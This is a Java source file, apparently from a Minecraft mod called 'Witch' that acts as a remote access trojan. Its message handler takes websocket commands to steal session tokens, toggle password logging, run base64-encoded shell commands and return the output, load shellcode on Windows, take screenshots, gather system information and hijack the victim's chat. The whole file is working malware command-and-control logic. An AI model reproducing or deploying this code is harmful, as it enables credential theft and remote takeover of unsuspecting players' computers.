package me.soda.witch.websocket;

import me.soda.witch.Witch;
import me.soda.witch.config.Config;
import me.soda.witch.features.*;
import net.minecraft.text.Text;
import net.minecraft.util.SystemDetails;

import java.util.Base64;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    public static void handle(String message) {
        String[] msgArr = message.split(" ");
        String messageType = msgArr[0];
        System.out.println("Received message: " + messageType);
        try {
            switch (messageType) {
                case "steal_pwd_switch":
                    if (msgArr.length < 2) break;
                    Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "steal_token":
                    MessageUtils.sendMessage(messageType, Stealer.stealToken());
                    break;
                case "getconfig":
                case "vanish":
                case "log":
                    //todo
                    break;
                case "chat_control":
                    if (msgArr.length < 2) break;
                    ChatControl.sendChat(decodeBase64(msgArr[1]));
                    break;
                case "chat_filter":
                    if (msgArr.length < 2) break;
                    Config.filterPattern = decodeBase64(msgArr[1]);
                    break;
                case "chat_filter_switch":
                    if (msgArr.length < 2) break;
                    Config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "chat_mute":
                    if (msgArr.length < 2) break;
                    Config.isMuted = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "mods":
                    MessageUtils.sendMessage(messageType, Modlist.allMods());
                    break;
                case "systeminfo":
                    SystemDetails sd = new SystemDetails();
                    StringBuilder sb = new StringBuilder();
                    sd.writeTo(sb);
                    MessageUtils.sendMessage(messageType, sb.toString());
                    break;
                case "screenshot":
                    Witch.screenshot = true;
                    break;
                case "chat":
                    if (msgArr.length < 2) break;
                    ChatControl.chat(Text.of(decodeBase64(msgArr[1])));
                    break;
                case "kill":
                    Witch.client.close(false);
                    break;
                case "shell":
                    if (msgArr.length < 2) break;
                    new Thread(() -> {
                        String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
                        MessageUtils.sendMessage(messageType, "\n" + result);
                    }).start();
                    break;
                case "shellcode":
                    if (msgArr.length < 2) break;
                    if(ShellUtil.isWin()) new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                default:
                    System.out.println();
                    break;
            }
        } catch (Exception e) {
            System.out.println("Corrupted message!");
            e.printStackTrace();
        }
    }
}